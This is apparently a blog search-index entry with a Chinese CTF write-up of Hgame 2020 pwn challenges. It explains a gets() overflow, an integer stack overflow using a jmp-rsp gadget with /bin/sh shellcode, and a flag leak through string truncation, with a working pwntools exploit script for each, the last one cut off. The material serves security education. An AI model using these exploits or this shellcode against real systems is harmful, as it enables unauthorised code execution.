<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020 Hgame pwn writeup</title>
      <link href="/2020/02/12/2020-Hgame-pwn-writeup/"/>
      <url>/2020/02/12/2020-Hgame-pwn-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-Hgame"><a href="#2020-Hgame" class="headerlink" title="2020 Hgame"></a>2020 Hgame</h1><p>Hgame是杭电在寒假期间举办的新生赛，持续时间长达四周，每周都会放出新题，越到后面难度越大。比赛好像是1月16号开始的，到2月14号结束（情人节？）…</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212004711.png" data-fancybox="group" data-caption="main_page" class="fancybox"><img alt="main_page" title="main_page" data-src="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200212004711.png" class="lazyload"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>春节期间，在河北老家待着，十分无聊，又赶上新冠疫情蔓延，出家无望，此时<a href="https://imagin.vip/" target="_blank" rel="noopener">imagin</a>师傅对我说：</p><blockquote><p>来打CTF鸭！</p></blockquote><p>于是，错过注册日期的我，用imagin师傅的帐号来Hgame凑凑热闹，重新拾起我丢了多年的pwn…</p><h2 id="比赛规则"><a href="#比赛规则" class="headerlink" title="比赛规则"></a>比赛规则</h2><ol><li>比赛分为线上赛（面向所有选手进行）与线下赛（仅面向部分校内选手）；</li><li>所有选手均以个人为单位参赛；</li><li>禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路等，对平台、参赛者或其他人员进行攻击等，违者分数作废并取消比赛资格；</li><li>每周结束后，校内选手请发送该周题目的 Writeup 到 <a href="mailto:wp@vidar.club">wp@vidar.club</a>，截止时间为每周五晚上八点；</li><li><strong>在<em>每周五晚上八点</em>之前，请校内外的师傅们不要散播任何与上一周题目有关的题解、Flag；</strong></li><li>每道题目的一、二、三血分别有 5%、 3%、1% 的额外分数加成。</li></ol><h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><p>我是大年三十开始做的，所以完美的错过了week1的比赛时间，不过还是做了做week1的pwn，就当是预习一下吧~</p><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><ul><li>题目描述：无脑AAA太无聊了，挑战更高难度的无脑AAA！</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_1/Hard_AAAAA" target="_blank" rel="noopener">Hard_AAAAA</a></li><li>考察点：变量覆盖</li><li>难度：入门</li><li>分值：75</li><li>完成人数：172</li></ul><p>反汇编得到源码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+7Bh] [ebp-31h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+A0h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+A4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  alarm(<span class="number">8u</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">160u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's 0O0o\\0O0!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(<span class="string">"0O0o"</span>, &amp;v5, <span class="number">7u</span>) )</span><br><span class="line">    backdoor();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>程序中存在后门<code>backdoor()</code>，开启后门的条件是变量<code>v5</code>等于<code>&quot;0O0o&quot;</code>，不难看出变量<code>s</code>其后便是变量<code>v5</code>，而<code>gets(&amp;s)</code>由于没有检查<code>s</code>的长度，这将导致向<code>s</code>中输入过长的字符串时，覆盖掉变量<code>v5</code>的值，调试一下得到偏移量为123，所以只要输入<code>&#39;a&#39;*123+&#39;0O0o&#39;</code>即可启动后门，拿到shell。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>虽然没啥写脚本的必要，但是我写了个<a href="https://github.com/TaQini/ctf/tree/master/script" target="_blank" rel="noopener">脚本</a>，用来自动生成exp模板，就当是展示一下效果吧：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Hard_AAAAA'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">backdoor = <span class="number">0x8048636</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">offset = <span class="number">123</span></span><br><span class="line">payload = <span class="string">'A'</span>*offset</span><br><span class="line">payload += <span class="string">'0O0o\0O0'</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">"Let's 0O0o\\0O0!\n"</span>)</span><br><span class="line"><span class="comment"># debug('b *0x080485FD')</span></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"><span class="comment"># info_addr('tag',addr)</span></span><br><span class="line"><span class="comment"># log.warning('--------------')</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="Number-Killer"><a href="#Number-Killer" class="headerlink" title="Number_Killer"></a>Number_Killer</h3><ul><li>题目描述：看起来人畜无害的一些整数也能秒我？(吃惊)</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_2/Number_Killer" target="_blank" rel="noopener">Number_Killer</a> </li><li>考察点：整数shellcode</li><li>难度：简单</li><li>分值：100</li><li>完成人数：77</li></ul><p>首先查看程序的保护方式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> checksec Number_Killer </span></span><br><span class="line">[*] '/home/taqini/Desktop/ctf/hgame2020/pwn/week1_2/Number_Killer'</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></div><p>什么保护都没有开，栈可执行，因此可以直接在栈中执行<code>shellcoode</code></p><p>接下来分析程序，程序反编译结果如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  __int64 v4[<span class="number">11</span>]; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Let's Pwn me with numbers!"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">    v4[i] = readll();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里<code>v4</code>是个整数数组，长度为12，但是在for循环中却向<code>v4</code>中读了20个整数，因此将导致栈溢出。</p><p>用<code>gdb</code>调试程序，得到数组<code>v4</code>的首地址<code>v4 = 0x7fffffffda90</code>，以及返回地址<code>ret_addr = 0x7fffffffdaf8</code>，二者相差104个字节，由于<code>v4</code>存的整数<code>int64</code>类型，大小是8字节，因此读入13个整数后，将覆盖程序返回地址。</p><p>程序代码中有一个出题人给的<code>gift</code>函数：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400789 gift            proc near</span><br><span class="line">.text:0000000000400789 ; __unwind &#123;</span><br><span class="line">.text:0000000000400789                 push    rbp</span><br><span class="line">.text:000000000040078A                 mov     rbp, rsp</span><br><span class="line">.text:000000000040078D                 jmp     rsp</span><br><span class="line">.text:000000000040078D gift            endp</span><br></pre></td></tr></table></figure></div><p>能直接利用其中的<code>gadget: jmp rsp</code>，将返回地址覆盖为<code>0x40078D</code>(gadget的地址)，把程序的控制流劫持到栈中。溢出发生是<code>rsp</code>的值正好是<code>v4</code>的首地址，因此向<code>v4</code>中布置<code>shellcode</code>即可。</p><p>这题有以下几点要注意：</p><ul><li>只能输入13个整数，因此shellcode的长度应该小于104字节</li><li>需要将<code>shellcode</code>每8个字节转成一个<code>int64</code>，且在<code>readall()</code>存在检查，整数的长度不能超过20，因此需要寻找一个合适的<code>shellcode</code>，不能用<code>pwntool</code>自动生成</li></ul><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./Number_Killer'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line"></span><br><span class="line">jrsp = <span class="number">0x0040078A</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05\x00\x00'</span></span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x7fffffffda90</span></span><br><span class="line">ret = <span class="number">0x7fffffffdaf8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop1</span></span><br><span class="line">ru(<span class="string">'Let\'s Pwn me with numbers!\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</span><br><span class="line">    sl(str(i))</span><br><span class="line">sl(str(<span class="number">0x0000000b00000000</span>))</span><br><span class="line">sl(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line">sl(str(jrsp))</span><br><span class="line"></span><br><span class="line">sh = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)/<span class="number">8</span>):</span><br><span class="line">    sh.append(u64(shellcode[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sh:</span><br><span class="line">    <span class="keyword">print</span> str(i),len(str(i))</span><br><span class="line">    sl(str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug('b *0x0000000000400766')</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="One-Shot"><a href="#One-Shot" class="headerlink" title="One_Shot"></a>One_Shot</h3><ul><li>题目描述：一发入魂</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/hgame2020/pwn/week1_3/One_Shot" target="_blank" rel="noopener">One_Shot</a></li><li>考察点：字符串截断</li><li>难度：入门</li><li>分值：100</li><li>完成人数：119</li></ul><p>反汇编分析程序：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> fd[<span class="number">2</span>]; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="number">0L</span>L;</span><br><span class="line">  *(_QWORD *)fd = <span class="built_in">open</span>(<span class="string">"./flag"</span>, <span class="number">0</span>, envp);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">read</span>(fd[<span class="number">0</span>], &amp;flag, <span class="number">0x1E</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Firstly....What's your name?"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%32s"</span>, &amp;name);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"The thing that could change the world might be a Byte!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Take tne only one shot!"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  *v4 = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"A success?"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Goodbye,%s"</span>, &amp;name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>首先这题打开<code>/flag</code>文件并且把内容读到<code>flag</code>变量中，然后读一个32字节的字符串到<code>name</code>变量中，还给了一个<strong>任意内存置1</strong>的漏洞，最后打印<code>name</code>。</p><p>我们知道，在C语言中，字符串以末尾1字节的<code>\x00</code>作为结束的标志。如果打印字符串的函数没有遇到<code>\x00</code>字节，则会一直打印字符。</p><p><code>name</code>和<code>flag</code>都定义在<code>bss</code>段，而且<code>flag</code>紧紧按着<code>name</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006010C0 name            db    ? </span><br><span class="line">.bss:00000000006010E0 flag            db    ?</span><br></pre></td></tr></table></figure></div><p>因此利用<strong>任意内存置1</strong>漏洞，把<code>name</code>末尾的<code>\x00</code>置1，在程序打印<code>name</code>时，就会顺便把<code>flag</code>打印出来。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./One_Shot'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = local_libc <span class="comment"># '../libc.so.6'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               